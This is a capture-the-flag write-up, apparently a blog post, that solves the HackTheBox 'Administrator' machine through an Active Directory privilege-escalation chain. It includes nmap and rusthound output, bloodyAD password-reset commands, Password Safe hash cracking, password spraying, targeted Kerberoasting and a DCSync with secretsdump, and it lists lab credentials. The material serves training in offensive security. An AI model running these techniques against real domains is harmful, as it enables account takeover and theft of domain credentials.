---
categories:
- HackTheBox-Medium
- Active Directory Exploitation Track
image:
  path: Administrator.png
layout: post
media_subpath: /assets/img/Administrator
tags:
- Assumed Breach
- Hash Cracking
- Bloodhound
- rusthound-ce
- ACLs
- Targeted-kerberoast
- GenericWrite
- GenericAll
- DCSync
- Secretsdump
title: HackTheBox | Administrator
---

Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael, allowing us to reset his password. With access as michael, it is revealed that he can force a password change on the user benjamin, whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily. Further enumeration shows that emily has GenericWrite permissions over the user ethan, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan, who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.

>As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich
{: .prompt-info }

## NMAP
```zsh
PORT     STATE SERVICE       VERSION  
21/tcp   open  ftp           Microsoft ftpd  
| ftp-syst:    
|_  SYST: Windows_NT  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 19:35:52Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2025-04-19T19:36:10  
|_  start_date: N/A  
|_clock-skew: 7h00m00s  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required
```
From the ports open its a DC..also keep in mind that the clock-skew is 7h00m00s so if we are to do anything kerberos related we'll have to sync our time to dc.
## smb
we can use nxc to get basic info on the domain
*[Image: image]*
we do see it is the DC at domain administartor.htb
We have creds so lets check access.
*[Image: image]*
we have read but there is no non-default share.
So lets get list of users
*[Image: image]*
We can also check for acces through winrm.

## Bloodhound data and michael
Lest now get Bloodhound data..ill be using rusthound-ce
```zsh
rusthound-ce -u 'Olivia' -p 'ichliebedich' --domain administrator.htb --zip  
---------------------------------------------------  
Initializing RustHound-CE at 15:48:46 on 04/17/25  
Powered by @g0h4n_0  
---------------------------------------------------  
  
[2025-04-17T12:48:46Z INFO  rusthound_ce] Verbosity level: Info  
[2025-04-17T12:48:46Z INFO  rusthound_ce] Collection method: All  
[2025-04-17T12:48:46Z INFO  rusthound_ce::ldap] Connected to ADMINISTRATOR.HTB Active Directory!  
[2025-04-17T12:48:46Z INFO  rusthound_ce::ldap] Starting data collection...  
[2025-04-17T12:48:47Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-04-17T12:48:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=administrator,DC=htb  
[2025-04-17T12:48:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-04-17T12:51:15Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=administrator,DC=htb  
[2025-04-17T12:51:15Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-04-17T12:54:12Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=administrator,DC=htb  
[2025-04-17T12:54:12Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-04-17T12:54:16Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=administrator,DC=htb  
[2025-04-17T12:54:16Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)  
[2025-04-17T12:54:17Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=administrator,DC=htb  
[2025-04-17T12:54:17Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...  
[2025-04-17T12:54:17Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10  
[2025-04-17T12:54:18Z INFO  rusthound_ce::api] Parsing LDAP objects finished!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 11 users parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!  
[2025-04-17T12:54:18Z INFO  rusthound_ce::json::maker::common] .//20250319155418_administrator-htb_rusthound-ce.zip created!  
  
RustHound-CE Enumeration Completed at 15:54:18 on 04/17/25! Happy Graphing!
```
And straight off the bat we see she has outbound object control over michael and that the permission is GenericAll.
*[Image: image]*
we could do a shadow creds attack but adcs isnt present as we can see from nxc
*[Image: image]*
Targeted kerberoast might give us a hash that we cannot crack,
So our best bet is changing password..very not stealthy especially in an enterprise or monitored network tho.
so we'll change the password and then ask for kerberos ticket for persistence.
```zsh
bloodyAD --host DC.administrator.htb -u Olivia -p ichliebedich set password michael P4ssw0rd@254  
[+] Password changed successfully!
```
Since to get ticket we'll utilise kerberos.Make sure to sync time with DC.
Having issues with dc time syncing?
Check out the method i use [here](https://0xc4rc3l.github.io/posts/Fixing-Kerberos-Clock-Skew/)
and we can ask for michaels tgt.
*[Image: image]*
## Michael and Benjamin
From bloodhound michael has force change password on benjamin
*[Image: image]*
we can utilise the same command from bloodhound to change benjamins password.
```zsh
KRB5CCNAME=michael.ccache bloodyAD --host DC.administrator.htb -k set password benjamin P4ssw0rd2@254  
[+] Password changed successfully!
```
And request a tgt as benjamin
*[Image: image]*
## Benjamin, FTP and emily
But as benjamin we dont have much.
we are a member of share moderators.
*[Image: image]*
But Share moderators dont have control over anything and benjamin is the only user.
We did have ftp but olivia did not have access to it
*[Image: image]*
and so did michael
*[Image: image]*
But Benjamin does have access.
*[Image: image]*
And listing contents we get a file named Backup.psafe3.
*[Image: image]*
we can get the file using nxc
*[Image: image]*
and we do see its 
```zsh
file Backup.psafe3    
Backup.psafe3: Password Safe V3 database
```
We see is a password save file.
we can try to open it using password safe..if youre on kali its just `sudo apt install passwordsafe`
But first well need a password..We can utilise pwsafe2john to get a hash an dattempt to crack it.
```zsh
pwsafe2john Backup.psafe3 > backup.hash
```
And then try cracking using john.
*[Image: image]*
And we are able to crack with the password being `tekieromucho`
so we can open the file now
*[Image: image]*
so lets copy the passwords of each.
```zsh
Alexander Smith  /  UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily Rodriguez  /  UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma Johnson     / WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
From the list of users we did have users
```zsh  
alexander
emily
emma
```
We could try to do a spray to see if any ine them reused their passwords.
we can utilise nxc.
*[Image: image]*
And we have access to other creds
```zsh
emily / UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
## winrm as emily and user flag
From bloodhound we do see she is a member of remote management.
*[Image: image]*
And we can confirm access to winrm using nxc
*[Image: image]*
and finally winrm to get access to user flag.
*[Image: image]*
## emily,Ethan and DCSync
Looking at outbound controls as emma user
*[Image: image]*
we have generic write over ethan
* Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
and looking at ethan we do see ethan can DCSync
*[Image: image]*
So our attack chains will be 
* adding spn to ethan then performing kerberoast on the user
* Performing DCSync attack to dump domain hashes
### 1-Targeted kerberoast on ethan
we can utilise targetedkerbroast we can get it from [Here](https://github.com/ShutdownRepo/targetedKerberoast)
*[Image: image]*
It gives us a hash belonging to ethan.
lets attempt to crack it,ill be using john once again.
*[Image: image]*
so we now have creds as ethan and password as `limpbizkit`
### 2-DCSync attack as ethan
The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.
**Important Notes about DCSync:**
- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
To perform the attack we can use secretsdump from impacket-suite.
And after running it dumps domain hashes.
*[Image: image]*
we see pwned and that confims to us we do have privileged access.
so lets winrm.
*[Image: image]*
And we get a confirmation of complete compromise and root.txt.
Until Next time adios.
